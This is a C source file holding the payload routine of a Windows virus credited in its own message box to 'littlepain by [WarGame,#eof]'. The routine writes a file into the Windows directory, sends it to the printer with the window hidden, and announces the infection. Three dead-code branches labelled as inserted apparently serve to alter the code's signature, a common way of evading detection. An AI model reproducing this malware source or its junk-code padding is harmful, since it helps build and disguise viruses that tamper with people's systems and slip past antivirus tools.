#include "data_globals.h"
#include <windows.h>
#include <shellapi.h>
#include <string.h>
#include <stdlib.h>   // added for malloc/free

void _Payload(void)
{
    CHAR flag_path[MAX_PATH];
    HANDLE flag_fd;
    DWORD written;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    GetWindowsDirectoryA(flag_path, MAX_PATH);
    strcat(flag_path, "\\MSG_FOR_YOU.txt");

    flag_fd = CreateFileA(flag_path, GENERIC_WRITE, FILE_SHARE_WRITE,
                          NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (flag_fd != INVALID_HANDLE_VALUE)
    {
        WriteFile(flag_fd, "Dear user, your system needs some security improvements!",
                  56, &written, NULL);

        // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
        if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
            char *tmp = (char *)malloc(64);
            if (tmp != NULL) {
                strcpy(tmp, "dummy");
                volatile DWORD len = strlen(tmp);
                volatile BYTE check = 0;
                for (volatile DWORD i = 0; i < len; i++) {
                    check ^= tmp[i];
                }
                volatile DWORD j = 0;
                while (j < 2) {
                    check += j;
                    j++;
                }
                char tmp2[32];
                memcpy(tmp2, tmp, 4);
                volatile DWORD val = (DWORD)tmp2[0] + check;
                val += len;
                free(tmp);
            }
        }

        CloseHandle(flag_fd);
        ShellExecuteA(NULL, "print", flag_path, NULL, NULL, SW_HIDE);
        MessageBoxA(NULL, "Infected by littlepain by [WarGame,#eof] ( italian guy )", "Credits",
                    MB_OK | MB_ICONINFORMATION);
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD i = 0; i < 2; i++) {
            extra_val += (hash >> i) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        memset(dummy_array, 0, sizeof(dummy_array));
    }
}
